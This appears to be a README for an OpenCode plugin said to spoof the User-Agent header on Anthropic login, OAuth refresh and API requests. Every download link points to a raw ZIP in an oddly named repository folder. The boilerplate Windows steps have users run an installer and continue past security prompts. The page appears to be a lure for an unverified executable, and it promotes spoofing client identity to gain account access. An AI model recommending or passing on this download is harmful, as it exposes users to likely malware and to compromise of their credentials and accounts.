# 🧩 opencode-anthropic-user-agent-plugin - Set a Custom Anthropic User-Agent

[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip)

## 📥 Download

Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip

Use the file from the latest release for Windows, then follow the setup steps below.

## 🖥️ What this tool does

This plugin helps OpenCode send a custom Anthropic `User-Agent` when it talks to Anthropic services.

It can affect:

- Claude Pro or Max login
- OAuth token refresh
- Anthropic prompt and message requests
- Anthropic API key creation

It works inside the OpenCode app. You do not need to edit OpenCode files by hand.

## ✅ Before you start

Use a Windows PC with:

- A recent version of Windows 10 or Windows 11
- Internet access
- OpenCode already installed
- Access to the release file from the link above

If you use Claude or Anthropic sign-in, make sure you can log in to your account before you begin.

## 🚀 Download and install on Windows

1. Open the release page: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip
2. Find the latest release at the top of the page
3. Download the Windows file from that release
4. Save the file to a folder you can find again, like Downloads or Desktop
5. If the file is a ZIP file, right-click it and choose Extract All
6. Open the extracted folder
7. If the release includes an installer, double-click it to run
8. If the release includes a package file, place it in the folder your OpenCode plugin setup uses
9. Restart OpenCode after the file is in place

If Windows shows a security prompt, choose the option to keep going only if you trust the file source and the GitHub release page matches the project name.

## 🧭 How to use it

After install, OpenCode will use the plugin when it sends requests to Anthropic hosts.

You do not need to start it from a separate app.

You can use it for:

- Signing in with Claude Pro or Max
- Refreshing an OAuth token
- Sending messages to Anthropic models
- Creating an Anthropic API key

## ⚙️ Basic setup

If your release comes with a settings file, set the `User-Agent` value you want OpenCode to use.

A simple setup may look like this in plain terms:

- Choose the custom browser or app identity you want Anthropic to see
- Save the setting
- Restart OpenCode
- Sign in again if needed

If the release uses a config file, keep the file name the same and place it where the plugin instructions say it belongs.

## 🧰 Typical Windows setup flow

1. Download the release from GitHub
2. Extract the file if needed
3. Copy the plugin file into the OpenCode plugin folder
4. Open OpenCode
5. Check that your Claude or Anthropic sign-in works
6. Send a test prompt
7. If the app asks for a fresh login, complete it

## 🔎 What you should see

When the plugin is working, OpenCode should:

- Use the custom `User-Agent` during Anthropic login
- Use the same header for token refresh
- Use the same header for prompt and message requests
- Keep working without you patching files by hand

You may not see a visible change in the app. The main sign is that login and Anthropic requests work with the plugin active.

## 🛠️ If something does not work

Try these steps:

1. Make sure you downloaded the latest release
2. Confirm the file finished downloading
3. Extract the ZIP file before using it
4. Put the file in the correct OpenCode plugin folder
5. Restart OpenCode
6. Sign out and sign in again
7. Check that no old plugin copy is still in the folder
8. Try a fresh download if the file looks broken

If OpenCode does not seem to load the plugin, move the file out of the folder, then put it back, and start the app again.

## 📁 File layout

A common Windows layout looks like this:

- `Downloads`
  - `opencode-anthropic-user-agent-plugin.zip`
- `Desktop`
  - `opencode-anthropic-user-agent-plugin`
    - plugin file
    - config file
    - README

Keep the folder name clear so you can find it later.

## 🔒 Privacy and account use

This plugin changes the header OpenCode sends to Anthropic services.

Use a value that matches the account or app identity you want to use.

If you use multiple accounts, keep each setup separate so you do not mix settings.

## 🧾 Common questions

### Do I need programming knowledge?

No. You only need to download the release, extract it if needed, and place the file where OpenCode can use it.

### Do I need to change OpenCode code?

No. The plugin works by changing the request header inside the OpenCode process.

### Can I use it for login and normal requests?

Yes. It applies to both auth traffic and model requests.

### Do I need to keep the setup tool open?

No. Once the plugin is in the right place and OpenCode restarts, it can work in the background.

## 📦 Download again

Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip

Use the latest release file for Windows, then install it with the steps above

## 🗂️ Suggested plugin folder names

You can keep the file in a folder named:

- `opencode-anthropic-user-agent-plugin`
- `OpenCode Plugins`
- `Anthropic User Agent`

Use a name that makes the folder easy to find.

## 🔄 Update steps

When a new release appears:

1. Open the release page
2. Download the newest Windows file
3. Remove the older plugin file if needed
4. Replace it with the new file
5. Restart OpenCode
6. Test sign-in or a prompt request

## 🧩 Notes for OpenCode users

This plugin is meant for OpenCode users who need Anthropic requests to use a custom `User-Agent`.

It can help when account access, token refresh, or request identity depends on that header.

Keep the release file in a safe place so you can install it again if you reinstall Windows or OpenCode